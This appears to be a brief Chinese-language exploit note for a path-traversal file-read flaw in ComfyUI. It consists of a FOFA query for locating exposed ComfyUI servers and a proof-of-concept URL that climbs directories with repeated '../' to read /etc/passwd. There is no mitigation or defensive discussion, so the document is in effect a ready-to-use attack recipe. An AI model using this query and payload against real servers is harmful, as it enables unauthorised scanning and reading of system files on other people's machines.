## omfyUI follow_symlinks文件读取漏洞

## fofa
```
app="ComfyUI"
```

## poc
```
http://ip:8188/../../../../../../../../../../../../../../etc/passwd
```
